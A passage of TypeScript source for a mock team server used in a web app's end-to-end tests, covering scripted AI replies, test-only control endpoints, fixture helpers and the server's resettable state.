// A mock team server for the web client's end-to-end tests: the REST API of shared/src/api (every response is
// checked against the contract schema, every JSON body is validated like the real server does), the WebSocket
// protocol of ws.ts (hello / seq / resume / reset), and the built web app served by the real serveWeb() of
// server/src/routes/web-static.ts (same CSP and cache headers as production; /sw.js gets no-op badge calls in front,
// see withoutWorkerBadge).
//
// The AI is scripted by keywords in the message: "artifact", "react", "ask", "error", "slow", "files", "search",
// "cap-tools" / "cap-time" (the answer pauses at the per-answer limit of tool calls / time: done with stopReason;
// at the time limit a step still running ends paused), "multi" with "ask" (a question with several answers),
// "sub-agent" (a sub-task step with its sub-agent's steps under it, Step.parentId), "stop-cut" (a step still running
// when the person presses Stop ends stopped, Step.stopped), "wrong-guess" (a read of a file name that does not exist
// fails, then the AI finds and reads the right file), "save-fails" (the AI's last step, a save, fails);
// anything else gets a Markdown answer with a table, code, math, a Mermaid diagram and an external image; "long list"
// gets a list of 400 lines, more than one room message holds (comes in big pieces).
// "대화방에 보내기" (shareAnswerToRoom): to a room of POST /__test/rooms; like server/src/chat/answer-share.ts, short: a row
// per linked file (one in a person's own folder or finance/ nobody else in the room opens; one I cannot open is only
// counted) and, for an answer with recorded sources ("sources"), the provenance line (the room's other members, the
// folders of those files I may open, more that I cannot), with a confirmKey; sent with that key (POST
// /__test/share-changed makes the next one stale: asked again) or an older client's confirm = that many people, the linked
// files asked for go as room files. "share files" answers with a quote in my folder, a shared file and one nobody opens.
// The rooms answer their own reads (the room, its messages, members, AI, read) from what was sent.
// Test-only controls: POST /__test/file {path, text | base64} (a team file and its folders), POST /__test/rmdir {path} (a folder gone from disk; its rule rows stay), POST /__test/download-only {path} (a generated, quarantined file: FileEntry.downloadOnly), POST /__test/reset {setup?: boolean, teamLocale?: 'ko'|'en'|'id' (default ko), usersFollowTeam?:
// boolean (seeded people have no own language), mustChange?: username (signs in with a temporary password), withAdmin?: boolean (admins dana / 'dana password 1' and eve)}, POST /__test/drop-ws, POST /__test/server-version, POST /__test/upload-delay {ms} (an upload's answer comes that late, until the next reset),
// POST /__test/revoke {path} (a folder becomes invisible to everyone + access_changed notice), POST /__test/skills
// {files: [{path, name, description}]} (skill files; skills/임원/ is for admins only),
// POST /__test/schedule-review (the owner gets a scheduled task nobody confirmed, paused for review; "siteask" with
// "ask" is an address card that offers "allow this site in this conversation"),
// POST /__test/confidential {all?: boolean} (Safe operations 1A on: every chat confidential; otherwise a chat becomes
// confidential when a message in it says "confidential"), POST /__test/artifact {type, content} (the next "artifact"
// answer writes exactly this), POST /__test/connection {…ConnectionStatus fields} (Admin > System > Connection shows
// them until the next reset), POST /__test/speech-host {…SpeechHost fields} (this server's cores, speed and hosting
// for "Turn video sound into text", and the tools Voice input lacks, until the next reset), POST /__test/skill-list
// {…SkillsOverview.aiList} (the Team skills page's "how many skills the AI sees" counts, until the next reset),
// POST /__test/speech {provider, key?: boolean, chosen?: false}
// (the team's speech provider and whether an OpenRouter key is set; chosen false: not chosen, read from the key),
// GET-or-POST /__test/transcribe-chats (the chat id each voice input named, null for a new chat; a confidential chat's
// recording with OpenRouter is refused, 403), POST
// /__test/transcribe-progress {message, progress, ms} (the next transcription jobs say that label first, as a server that
// downloads its speech model does, and end after `ms`; until the next reset).
// External services: an address on a "down." host fails its check, the key "wrong-key" is refused, the fake MCP server
// offers two tools at the first check and a third from the next one (one on a "many." host offers 150, of which the
// first 100 are kept), and a sign-in completes on the second poll.
// POST /__test/dev-env {srt?: true, network?: 'offline', sites?: string[]} turns the dev environment (experiment) on until
// the next reset (sites: the first person's own allowed sites).
// POST /__test/html-pdf {on: boolean} says whether this server prints HTML to PDF (Me.server.htmlPdf; off by default, as
// a server without a headless browser) until the next reset; GET /__test/html-pdf lists the pages printed so far.
// "/intro-deck …" builds the deck like round 2 of docs/DECISIONS.md "D2": an outline, one intro_deck call per slide (the
// third slide's first try fails and is tried again), the review, then the saved deck, with deck.progress after each and
// small slide pictures from GET /api/intro-decks/builds/:id/slides/:n; "deck-fail" in the message stops it after three
// slides. POST /__test/deck-pace {ms, thumbs?: false, tier?: 'standard' | 'deep'} sets the time per step (default 40 ms),
// whether pictures exist and the budget (the longer ones read the site first: phase "reading"), until the next reset.
import { z } from 'zod'
import type { DriveShare as MockDriveShare, DriveShareFolder as MockDriveFolder } from '@mycel/shared/api'
import type { KnowledgeGraphStatus, LocalSpeechTool } from '@mycel/shared/api'
// Keep the server renderer outside the browser TypeScript program; this module runs only in Bun.
const hwpEngine = import('../../../server/src/files/' + 'hwp-engine.ts').then(m => new m.NativeHwpEngine())
import {
  ApiErrorResponse, CSRF_HEADER, Room, RoomMessage, answerFilePaths, answerShareBody, ROOM_FILES_MAX, SMALL_UPLOAD_MAX, TeamGoal, type AnswerShareFile, type AnswerSharePlace, type RoomFile, type SkillChange, type SkillManagerGrant, type SkillSuggestion, DEV_SESSION_COOKIE, CHAT_ERROR_MESSAGES, type ChatErrorReason, ERROR_MESSAGES, LOCALE_HEADER, Locale, ServerEvent, UPLOAD_CHUNK_SIZE, WS_PATH, WsClose, isSchema, listEndpoints, uuidv7,
  type ApiName, type Artifact, type Attachment, type SkillInput, type DevEnvRun, type Chat, type Endpoint, type ErrorCode, type FileEntry, type FileVersion, type Folder, type Group, type Invite, type Job, type Me, type Message,
  MemberEngineChoice, WELCOME_RESULT_SKILL, GENERAL_TASKS_SKILL, GENERAL_BRIEF_SKILL, GENERAL_CARDNEWS_SKILL, CARD_NEWS_ARTIFACT_KEY, GENERAL_PROMO_SKILL, PROMO_ARTIFACT_KEY, PROMO_STYLES, GENERAL_DECK_SKILL, DECK_ARTIFACT_KEY, NOTES_FOLDER, PACK_FOLDERS, BRAND_IMAGES_FOLDER, type TeamLinkStarter, type WelcomeProgress, type Project, type ConnectionStatus, type ServerEventInput, type Step, type TrashItem, type TurnRequest, type UploadSession, type User, type Memory, type Budget, type TeamSettings, type AuditEntry, type Schedule, type DeckBuild,
} from '@mycel/shared/api'
import fs from 'node:fs'
import zlib from 'node:zlib'
import * as XLSX from 'xlsx'
import { CCITT_SCAN, JPX_SCAN, makeCidPdf, makeImagePdf, makePagedPdf, makePdf } from '../../../tests/lib/pdf'
import { serveWeb } from '../../../server/src/routes/web-static'
import { TEXT as TEAM_ICON_TEXT } from '../../../server/src/admin/team-icon'
import { msg as serverMsg } from '../../../server/src/auth/messages'
import { folderKeep, isParkedRow, isTeamDefaultFolder } from '../../../server/src/admin/folder-keep'
import { checkTeamIcon, TEAM_ICON_MAX_BYTES, type TeamIconFile } from '@mycel/shared'
import { Sealer } from '../../../server/src/credentials/seal'
import type { Credential, CredentialKind, CredentialLogin, MessageSourceFile, SealedSecret } from '@mycel/shared/api'
import type { Integration, IntegrationAccess, IntegrationFlow, IntegrationInput, IntegrationPatch, IntegrationRequest, IntegrationTemplate, IntegrationTool } from '@mycel/shared/api'
import { normalizeWebsite, SkillsOverview, type AccessFolderKind, type AccessTreeResponse, type FolderAccessResponse, type FolderEditPreview, type PersonAccessResponse } from '@mycel/shared/api'
import { RuleSet, type Access } from '../../../server/src/policy/access'
import { byPerson, folderInput, MAX_VIA, navigation, pageByPath, pageByPerson, ruleFolderOf, segsOf, shownPath, shownSegs, summarize, withoutOwnFolder } from '../../../server/src/admin/access-rows'
import { ruledAnswer, treeAnswer, type TreeMark, type TreeSource } from '../../../server/src/admin/access-tree'
import { editPreview, rulesHash } from '../../../server/src/admin/access-edit'
import os from 'node:os'
import path from 'node:path'
import { MockPlugins } from './plugins'

type Json = Record<string, unknown>
const sha256Hex = (d: Uint8Array) => new Bun.CryptoHasher('sha256').update(d).digest('hex')
const parentOf = (p: string) => (p.includes('/') ? p.slice(0, p.lastIndexOf('/')) : '')
/** like a server whose relay.officialAvailable is off: the official relay is not offered */
const defaultConnection = (): ConnectionStatus => ({ mode: 'self-relay', address: 'http://acme.localhost:19143', state: 'connecting', detail: null, connectedSince: null, direct: { enabled: false, port: 8443, fingerprintSha256: null }, teamName: 'acme', availableModes: ['self-relay', 'direct-only'] })
/** A one-page A4 PDF, the stand-in for what the server's headless browser prints (POST /api/files/html-pdf) */
const MOCK_PDF = '%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 595 842]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n'

class Fail extends Error {
  constructor(public code: ErrorCode, public status: number, msg?: string, public fields?: Record<string, string>, public params?: Record<string, string | number | boolean>) {
    super(msg ?? ERROR_MESSAGES[code].ko)
  }
}
/** the Claude sign-in's authorize address (tests/lib/fake-claude-login.ts has the same shape) */
const MOCK_CLAUDE_AUTHORIZE = 'https://claude.com/cai/oauth/authorize?code=true&client_id=mock&response_type=code&redirect_uri=https%3A%2F%2Fplatform.claude.com%2Foauth%2Fcode%2Fcallback&scope=user%3Ainference&code_challenge=mock&code_challenge_method=S256&state=good-state'
const fail = (code: ErrorCode, status: number, msg?: string, fields?: Record<string, string>, params?: Record<string, string | number | boolean>): never => {
  throw new Fail(code, status, msg, fields, params)
}
/** Like server/src/admin/users.ts temporaryFor: a typed temporary password must be ASCII, 8+ and not a common one. */
function checkTemp(pw: string | undefined): void {
  if (pw === undefined) return
  if (!/^[\x21-\x7e]+$/.test(pw)) fail('validation', 400, '임시 비밀번호에는 영문·숫자·기호만 쓸 수 있어요(공백·한글 불가). 한/영 키를 확인해 주세요.', { 'body.temporaryPassword': 'letters, digits and symbols only' })
  if (['12345678', 'password', 'qwerty123'].includes(pw.toLowerCase())) fail('validation', 400, '더 안전한 비밀번호를 정해 주세요. 너무 흔한 비밀번호예요.', { 'body.temporaryPassword': 'this password is too common' })
}
const tempUntil = () => new Date(Date.now() + 7 * 86400_000).toISOString()
const now = () => new Date().toISOString()
/** Admin > Activity log rows (made up), newest first: see the `audit` handler. */
function auditRows(): AuditEntry[] {
  const t = Date.now()
  const at = (ms: number) => new Date(t - ms).toISOString()
  const olga = { id: 'olga', name: 'Olga' }
  const bob = { id: 'bob', name: 'Bob' }
  const min = 60_000
  const day = 86_400_000
  const rows: AuditEntry[] = [
    { id: 'a1', source: 'admin', at: at(0), actor: olga, action: 'invite.create', target: 'member', turnId: null, detail: { role: 'member' } },
    ...[2, 4, 6, 8, 10].map((m, i): AuditEntry => ({ id: `s${i}`, source: 'auth', at: at(m * min), actor: bob, action: 'auth.login', target: 'bob', turnId: null, detail: { ip: '10.0.0.7' } })),
    { id: 'f1', source: 'file', at: at(12 * min), actor: olga, action: 'update', target: 'finance/2026/plan.md', turnId: null, detail: { size: 2048, sha256: 'c'.repeat(64), detail: null } },
    { id: 't1', source: 'tool', at: at(14 * min), actor: bob, action: 'read', target: null, turnId: null, detail: { summary: 'read hr/salaries.xlsx -> denied: no access', ok: 0 } },
    { id: 't2', source: 'tool', at: at(16 * min), actor: bob, action: 'read', target: null, turnId: null, detail: { summary: 'read marketing/plan.md', ok: 1 } },
    { id: 'k1', source: 'admin', at: at(day + 5 * min), actor: olga, action: 'skills.change', target: 'skills/weekly-team-report/SKILL.md', turnId: null, detail: null },
  ]
  for (let d = 2; d <= 121; d++) rows.push({ id: `o${d}`, source: 'auth', at: at(d * day), actor: olga, action: 'auth.login', target: 'olga', turnId: null, detail: { ip: '10.0.0.2' } })
  return rows
}
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms))

/** A slide's small picture for the intro deck being built (PNG, 64 × 36): the cover in the brand colour, the others
 * light with a title bar, so a tile looks like a slide. */
const CRC = Array.from({ length: 256 }, (_, n) => { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; return c >>> 0 })
const crc32 = (b: Uint8Array) => { let c = 0xffffffff; for (const x of b) c = CRC[(c ^ x) & 0xff]! ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0 }
function pngChunk(type: string, data: Uint8Array) {
  const out = new Uint8Array(12 + data.length), v = new DataView(out.buffer)
  v.setUint32(0, data.length)
  out.set(enc.encode(type), 4)
  out.set(data, 8)
  v.setUint32(8 + data.length, crc32(out.subarray(4, 8 + data.length)))
  return out
}
function slidePng(i: number): Uint8Array {
  const w = 64, h = 36
  const raw = new Uint8Array(h * (w * 3 + 1))
  const cover = i === 0
  for (let y = 0; y < h; y++) for (let x = 0; x < w; x++) {
    const at = y * (w * 3 + 1) + 1 + x * 3
    const bar = !cover && y >= 5 && y <= 7 && x >= 5 && x <= 34
    const mark = !cover && y >= 14 && y <= 27 && x >= 8 + (i % 3) * 16 && x <= 20 + (i % 3) * 16
    const [r, g, b] = cover ? [27 + x, 110 - y, 58 + x] : bar ? [20, 17, 15] : mark ? [27, 110, 58] : [250, 248, 244]
    raw.set([r, g, b], at)
  }
  const ihdr = new Uint8Array(13), v = new DataView(ihdr.buffer)
  v.setUint32(0, w); v.setUint32(4, h); ihdr.set([8, 2, 0, 0, 0], 8)
  const parts = [new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10]), pngChunk('IHDR', ihdr), pngChunk('IDAT', new Uint8Array(zlib.deflateSync(raw))), pngChunk('IEND', new Uint8Array())]
  const out = new Uint8Array(parts.reduce((n, x) => n + x.length, 0))
  let o = 0
  for (const x of parts) { out.set(x, o); o += x.length }
  return out
}

interface FileNode { type: 'file' | 'folder'; data?: Uint8Array; mtime: string; mime?: string }
interface WsData { user: string; windowId: string; epoch: string | null; after: number | null }
interface Ctx { user: User; params: Record<string, string>; query: Record<string, string>; body: any; req: Request; file?: File }
type Handler = (c: Ctx) => unknown | Promise<unknown>
/** Folders below the mock share account's top level, found by the folder picker's search */
const DRIVE_SUBFOLDERS = [{ id: 'folder-finance-q3', name: 'Finance Q3', kind: 'folder' as const }, { id: 'folder-contracts', name: 'Contracts', kind: 'folder' as const }]

const enc = new TextEncoder()
const dec = new TextDecoder()

const OWNER_PASSWORD = 'correct horse battery'
/** the general pack's card news as the server installs it (resources/skill-packs/general/ko/card-news), its form included:
 * a member who joins with the first result's invite lands on it */
const CARDNEWS_TEXT = '---\nname: card-news\ndescription: 카드뉴스 — 회사 소개서나 자료를 읽고 정사각형 카드뉴스 5장을 만들어요.\nmetadata:\n  title: 카드뉴스\n  inputs: |\n    [{"name": "topic", "label": "주제", "placeholder": "비워 두면 회사 소개 전체"}, {"name": "channel", "label": "어디에 올릴까요", "type": "choice", "default": "instagram", "options": [{"value": "instagram", "label": "인스타그램"}, {"value": "linkedin", "label": "링크드인"}, {"value": "blog", "label": "블로그"}]}, {"name": "files", "label": "자료 파일", "placeholder": "비워 두면 팀 브랜드 폴더의 회사 소개", "advanced": true}]\n---\n# 카드뉴스\n'
/** the general pack's promo video (resources/skill-packs/general/ko/promo-video), its form included: the welcome steps'
 * first result of docs/DECISIONS.md "V", still installed */
const PROMO_TEXT = '---\nname: promo-video\ndescription: 홍보 영상 — 회사 소개서나 자료를 읽고 팀 브랜드 폴더의 사진과 브랜드 색으로 세로형 홍보 영상을 만들어요.\nmetadata:\n  title: 홍보 영상\n  inputs: |\n    [{"name": "topic", "label": "주제", "placeholder": "비워 두면 회사 소개 전체"}, {"name": "channel", "label": "어디에 올릴까요", "type": "choice", "default": "instagram", "options": [{"value": "instagram", "label": "인스타그램"}, {"value": "linkedin", "label": "링크드인"}, {"value": "website", "label": "홈페이지"}]}, {"name": "files", "label": "자료 파일", "placeholder": "비워 두면 팀 브랜드 폴더의 회사 소개", "advanced": true}]\n---\n# 홍보 영상\n'
/** the general pack's intro deck (resources/skill-packs/general/ko/intro-deck), its form included: the welcome steps'
 * first result since docs/DECISIONS.md "D2"; a member who joins with its invite lands on it */
const DECK_TEXT = '---\nname: intro-deck\ndescription: 회사 소개서 — 회사 소개 자료나 홈페이지에서 읽은 내용으로 팀 브랜드 폴더의 사진과 브랜드 색을 써서 회사 소개서 슬라이드를 만들어요.\nmetadata:\n  title: 회사 소개서\n  inputs: |\n    [{"name": "topic", "label": "주제", "placeholder": "비워 두면 회사 전체"}, {"name": "audience", "label": "누구에게 보낼까요", "placeholder": "예: 제조업 고객사 · 비워 두면 누구에게나"}, {"name": "files", "label": "자료 파일", "placeholder": "비워 두면 팀 브랜드 폴더의 회사 소개", "advanced": true}]\n---\n# 회사 소개서\n'

/** like server/src/admin/settings.ts LOCALE_CHANGED */
const LOCALE_CHANGED = { type: 'notice', data: { level: 'info', code: 'locale_changed', message: '' } } as const
/** like server/src/admin/settings.ts BROWSER_POLICY_CHANGED */
const BROWSER_POLICY_CHANGED = { type: 'notice', data: { level: 'info', code: 'browser_policy_changed', message: '' } } as const
/** like server/src/admin/team-icon.ts TEAM_ICON_CHANGED */
const TEAM_ICON_CHANGED = { type: 'notice', data: { level: 'info', code: 'team_icon_changed', message: '' } } as const

export class MockServer {
  setupNeeded = false
  serverVersion = '0.1.0'
  epoch = uuidv7()
  seq = 0
  buffer: { seq: number; text: string }[] = []
  sockets = new Set<Bun.ServerWebSocket<WsData>>()
  sessions = new Map<string, string>() // token -> user id
  /** people whose latest sign-in used a temporary password (Me.session.tempLogin while they must change it) */
  tempLogins = new Set<string>()
  users: User[] = []
  passwords = new Map<string, string>()
  /** last password reset by an admin, per user id (Me.passwordReset) */
  resets = new Map<string, NonNullable<Me['passwordReset']>>()
  groups: Group[] = []
  invites: (Invite & { token: string })[] = []
  /** the team invite link (shared/src/api/team-links.ts): one open at a time; replaced and revoked tokens say "revoked" */
  teamLink: { id: string; token: string; groupIds: string[]; skillPath: string | null; starter: TeamLinkStarter | null; maxUses: number; uses: number; createdBy: { id: string; name: string }; createdAt: string; expiresAt: string } | null = null
  revokedTeamLinks = new Set<string>()
  /** the welcome steps' progress (server/src/onboarding/welcome.ts) */
  welcome: WelcomeProgress | null = null
  /** the chat first-result made for the deck, until its message is in (server: welcome.ts `deckChatId`, settleDeck) */
  deckChat: string | null = null
  /** a saved welcome row: finished once 회사 소개 is answered (put off, or saved with the deck started or a first result
   * answered) and 내 스킬, 팀 파일 and the invite are each done or put off, not while 내 스킬 waits for a computer
   * (server/src/onboarding/welcome.ts welcomeFinished, docs/DECISIONS.md "W5") */
  welcomeSaved(p: WelcomeProgress, at: string): WelcomeProgress {
    const st = p.steps
    const profile = st.profile === 'skipped' || (st.profile === 'done' && (!!p.resultChatId || st.result !== null))
    if (!p.finishedAt && profile && st.skills && st.files && st.invite && !p.skillsLater) p.finishedAt = at
    p.updatedAt = at
    return p
  }
  /** the saved company profile, and the website readings (server/src/onboarding/draft.ts, short: no chat of the list) */
  companyProfile: import('@mycel/shared/api').CompanyProfile | null = null
  profileDrafts = new Map<string, { userId: string; website: string; reads: number }>()
  /** the suggestion under answers a test set, and the ones closed */
  resultSuggestion: import('@mycel/shared/api').ResultSuggestion | null = null
  closedSuggestions = new Set<string>()
  /** team skill drafts (server/src/onboarding/skill-draft.ts, short): the source chat, reads so far, where it was saved */
  skillDrafts = new Map<string, { userId: string; sourceChatId: string; reads: number; saved: string | null }>()
  /** who made a team skill (server/src/skills/author.ts: its file's first version); pack skills have none */
  skillMakers = new Map<string, string>()
  folders: Folder[] = []
  chats: Chat[] = []
  /** the team chat rooms the signed-in person is in (empty unless a test sets them: /__test/rooms) */
  rooms: Room[] = []
  /** the messages of those rooms: only what was sent to them here ("대화방에 보내기"), oldest first */
  roomMessages = new Map<string, RoomMessage[]>()
  /** a shared answer's clientMessageId → its room message (the same id sent again gets it back) */
  sharedByClientId = new Map<string, RoomMessage>()
  /** POST /__test/share-changed: a "confirm" key given before this is stale (something changed meanwhile) */
  shareEpoch = 0
  messages: Message[] = []
  artifacts: Artifact[] = []
  /** intro decks built in round 2 (newest last) and the time per build step (POST /__test/deck-pace) */
  deckBuilds: DeckBuild[] = []
  deckPaceMs = 40
  deckThumbs = true
  deckTier: DeckBuild['tier'] = 'quick'
  projects: Project[] = []
  memories: Memory[] = []
  /** Settings › Scheduled tasks (POST /__test/schedule-review adds one nobody confirmed: needsReview) */
  schedules: (Schedule & { userId: string })[] = []
  /** Settings › Notifications (one person's, like the rest of this mock's per-person state) */
  notifyPrefs = MockServer.notifyPrefsDefault()
  static notifyPrefsDefault() {
    return { scheduleSuccess: true, scheduleFailure: true, connectionReconnect: true, skillSuggestions: true, roomMessages: true, roomLevel: 'direct' as 'direct' | 'all' | 'none', roomThreadReplies: true, quietHours: { on: false, start: '22:00', end: '08:00', weekends: false } }
  }
  budgets: Budget[] = []
  files = new Map<string, FileNode>()
  versions: FileVersion[] = []
  connection: ConnectionStatus = defaultConnection()
  trash: (TrashItem & { node: FileNode })[] = []
  uploads = new Map<string, UploadSession & { chunks: Map<number, Uint8Array> }>()
  attachments = new Map<string, Attachment & { data: Uint8Array }>()
  jobs = new Map<string, Job>()
  pendingAsk = new Map<string, (v: unknown) => void>()
  /** open cards by turn (GET /api/chats/:id/requests after a reload) */
  openAsks = new Map<string, { turnId: string; chatId: string; messageId: string; request: TurnRequest }>()
  stopped = new Set<string>()
  queuePositions = new Map<string, number>()
  queueRevision = 0
  settings: TeamSettings = defaultSettings()
  /** the team logo (Admin > Team settings): served by the real serveWeb() at /team-icon (the sidebar header); the tab
   * and app icons stay the product's */
  teamIcon: TeamIconFile | null = null
  /** Admin › Team settings › Knowledge graph (server/src/knowledge-graph/): made-up folders; POST /__test/knowledge-graph
   * {available?: boolean} says whether CodeGraph is "installed" */
  kg: KnowledgeGraphStatus = mockKnowledgeGraph(true)
  speechKey: { set: boolean; hint: string | null; updatedAt: string | null } = { set: false, hint: null, updatedAt: null }
  /** an admin chose the speech provider (stored); false: like server/src/admin/settings.ts, it reads OpenRouter while the
   * team's key is set and off without it (speechNow) */
  speechChosen = true
  /** the chat id each voice input named (null: a new chat) */
  transcribeChats: (string | null)[] = []
  /** transcription jobs report this label first and end after `ms` (POST /__test/transcribe-progress) */
  transcribeProgress: { message: string; progress: number | null; ms: number } | null = null
  /** GET /api/admin/speech-host: a 4-core self-installed server that has not measured its speed yet, with whisper.cpp and
   * ffmpeg (localMissing: the tools 'local' lacks) */
  speechHost = { cpuCores: 4, localPieceSec: 30, localSecPerSec: null as number | null, hostedNewSec: null as number | null, localMissing: [] as LocalSpeechTool[] }
  /** every request the client made (method + path), for assertions */
  log: string[] = []
  /** team skills: suggestions, changes under skills/ (who manages them is the folder rules: skillGrants) */
  suggestions: SkillSuggestion[] = []
  skillChanges: SkillChange[] = []
  /** engine / model named in chat requests (tests check people who may not pick never send one) */
  engineRequests: { name: string; user: string; engine?: unknown; model?: unknown }[] = []
  /** Admin > AI engines: "팀원이 엔진 고르기 허용" and the Claude-limit fallback (like the server: off by default) */
  memberChoice: MemberEngineChoice = { mode: 'off', groupIds: [], userIds: [] }
  limitFallback = false
  codexEnabled = true
  // the API engine: listed like on a real server, off here so chats and Admin Home do not count it
  apiEngineEnabled = false
  /** Google Drive's client on this test server: none (like a server not set up for it), or set up in Admin › App connectors */
  driveClient: 'none' | 'app' = 'none'
  /** Admin › Connectors › Google Drive: "Members can connect their own Google Drive" (off for a new team, like the server) */
  driveMembers = false
  /** Drives shared with the team (server/src/integrations/google-drive/shares.ts); never a token here either */
  driveShares: MockDriveShare[] = []
  /** a share sign-in under way: its flow id, and which share it signs in again for */
  driveShareFlow: { id: string; shareId: string | null; polls: number } | null = null
  /** Admin > AI connections: the team's connections (secrets are opened with the real server sealing code and dropped) */
  credentials: Credential[] = []
  credMemberOwn = true
  credSharedSubscriptions = false
  credLogins = new Map<string, CredentialLogin & { userId: string; personal: boolean; label: string; reconnectId?: string }>()
  sealer = new Sealer(fs.mkdtempSync(path.join(os.tmpdir(), 'mycel-mock-seal-')))
  /** External services (like server/src/integrations): personal and team connections. Keys and tokens are kept apart
   * and never go back out (only `hasSecret`). */
  integrations: MockIntegration[] = []
  plugins = new MockPlugins()
  /** after-update to-dos an admin dismissed (server/src/system/after-update.ts) */
  afterDismissed: string[] = []
  integrationSecrets = new Map<string, string>()
  integrationFlows = new Map<string, { flow: IntegrationFlow; integrationId: string; userId: string; polls: number }>()
  /** an admin's requests to members to connect a service as their own (like server/src/integrations/connections/requests.ts) */
  integrationRequests: (IntegrationRequest & { integrationId: string | null })[] = []
  /** an admin's templates each member connects with their own key (like server/src/integrations/connections/templates.ts) */
  integrationTemplates: (Omit<IntegrationTemplate, 'connected'> & { version: number })[] = []
  /** Team AX Cloud (server/src/system/deployment.ts): /__test/cloud switches it on until the next reset */
  cloud = false
  /** the 7-day team goal Home shows owners and admins (onboarding G): none unless /__test/team-goal sets one */
  teamGoal: TeamGoal | null = null
  /** Home's frequent skills (GET /api/skills/popular): none unless /__test/popular-skills names some by path */
  popular: { path: string; uses: number; users: number }[] = []
  /** POST /__test/dev-env: the dev environment (experiment) is on until the next reset (Me.server.devEnv, Team settings
   * › Dev environment); srt: true is the srt runner (warning version 2, the queue of the chat's runs); otherwise its
   * endpoints answer 404, like a server without MYCEL_DEV_ENV */
  devEnv: { srt?: { running: DevEnvRun[]; waiting: DevEnvRun[] } } | null = null
  /** POST /__test/html-pdf: the server prints HTML to PDF ("PDF로 저장" in an .html preview); the pages printed, with how */
  htmlPdf = false
  htmlPdfCalls: { path: string; how: 'save' | 'download' }[] = []
  /** the team setting devEnv.team (GET and PUT /api/admin/dev-env), off until an admin turns it on */
  devEnvTeam = MockServer.devEnvTeamDefault()
  static devEnvTeamDefault() {
    return { extraDomains: [] as string[], enabled: false, scope: { mode: 'writers' as 'writers' | 'selected', groupIds: [] as string[], userIds: [] as string[] }, network: 'open' as 'open' | 'offline',
      limits: { cpus: 1, memoryMiB: 2560, pids: 512, diskGiB: 4, idleStopMin: 30 }, consent: null as { by: { id: string; name: string } | null; at: string; warningVersion: number } | null }
  }
  /** the sites a person allowed and her Full internet switch (GET /api/dev-env/sites); per person, like the server */
  devEnvSites = new Map<string, { sites: { host: string; createdAt: string }[]; full: boolean }>()
  devEnvSitesOf(userId: string) {
    if (!this.devEnv?.srt) fail('not_found', 404)
    const mine = this.devEnvSites.get(userId) ?? { sites: [], full: false }
    this.devEnvSites.set(userId, mine)
    const base = { fullAvailable: true, fullWarningVersion: 1, maxSites: 100 }
    if (this.devEnvTeam.network === 'offline') return { state: 'no_network' as const, sites: [], fullInternet: false, teamSites: [], ...base }
    return { state: 'on' as const, sites: mine.sites, fullInternet: mine.full, teamSites: ['registry.npmjs.org', 'pypi.org', 'github.com', ...this.devEnvTeam.extraDomains], ...base }
  }
  devEnvTeamView() {
    if (!this.devEnv) fail('not_found', 404)
    const srt = !!this.devEnv!.srt
    return { setting: this.devEnvTeam, defaultDomains: ['registry.npmjs.org', 'pypi.org', 'github.com'], plan: srt ? { plan: 'starter', maxRunning: 1, cpus: 2, memoryMiB: 3072, pids: 1024, network: 'open' } : null,
      runner: srt ? 'srt' as const : 'box' as const, warningVersion: srt ? 2 : 1, availability: { available: true } }
  }

  constructor(o: { setup?: boolean } = {}) {
    this.reset(o)
  }

  generation = 0

  /** seeded people (olga, bob) have no language of their own */
  usersFollowTeam = false

  /** POST /__test/upload-delay: the bytes of an upload are in, the answer takes this long (a server that is finishing) */
  uploadDelayMs = 0
  private uploadAnswer = () => new Promise<void>((done) => setTimeout(done, this.uploadDelayMs))

  reset(o: { setup?: boolean; teamLocale?: Locale; usersFollowTeam?: boolean; mustChange?: string; withAdmin?: boolean } = {}) {
    this.generation++
    this.uploadDelayMs = 0
    this.setupNeeded = !!o.setup
    this.usersFollowTeam = !!o.usersFollowTeam
    this.serverVersion = '0.1.0'
    this.aiList = undefined
    this.cloud = false
    this.teamGoal = null
    this.popular = []
    this.devEnv = null
    this.htmlPdf = false
    this.htmlPdfCalls = []
    this.devEnvTeam = MockServer.devEnvTeamDefault()
    this.notifyPrefs = MockServer.notifyPrefsDefault()
    this.devEnvSites = new Map()
    this.epoch = uuidv7()
    this.seq = 0
    this.buffer = []
    for (const ws of this.sockets) ws.close(1012, 'reset')
    this.sessions.clear()
    this.tempLogins.clear()
    this.passwords.clear()
    this.resets.clear()
    this.users = []
    this.groups = []
    this.invites = []
    this.teamLink = null
    this.revokedTeamLinks.clear()
    this.welcome = null
    this.deckChat = null
    this.companyProfile = null
    this.profileDrafts = new Map()
    this.resultSuggestion = null
    this.closedSuggestions = new Set()
    this.skillDrafts = new Map()
    this.skillMakers = new Map()
    this.chats = []
    this.rooms = []
    this.roomMessages = new Map()
    this.sharedByClientId = new Map()
    this.shareEpoch = 0
    this.sources.clear()
    this.messages = []
    this.artifacts = []
    this.deckBuilds = []
    this.deckPaceMs = 40
    this.deckThumbs = true
    this.deckTier = 'quick'
    this.allConfidential = false
    this.nextArtifact = null
    this.projects = []
    this.memories = []
    this.schedules = []
    this.budgets = []
    this.versions = []
    this.trash = []
    this.uploads.clear()
    this.attachments.clear()
    this.jobs.clear()
    this.files.clear()
    this.log = []
    this.engineRequests = []
    this.suggestions = []
    this.skillChanges = []
    this.memberChoice = { mode: 'off', groupIds: [], userIds: [] }
    this.limitFallback = false
    this.codexEnabled = true
    this.apiEngineEnabled = false
    this.driveClient = 'none'
    this.driveMembers = false
    this.driveShares = []
    this.driveShareFlow = null
    this.credentials = []
    this.credMemberOwn = true
    this.credSharedSubscriptions = false
    this.credLogins.clear()
    this.integrations = []
    this.plugins.reset()
    this.afterDismissed = []
    this.integrationSecrets.clear()
    this.integrationFlows.clear()
    this.integrationRequests = []
    this.integrationTemplates = []
    this.settings = defaultSettings()
    this.teamIcon = null
    this.kg = mockKnowledgeGraph(true)
    this.speechKey = { set: false, hint: null, updatedAt: null }
    this.speechChosen = true
    this.transcribeChats = []
    this.transcribeProgress = null
    this.speechHost = { cpuCores: 4, localPieceSec: 30, localSecPerSec: null, hostedNewSec: null, localMissing: [] }
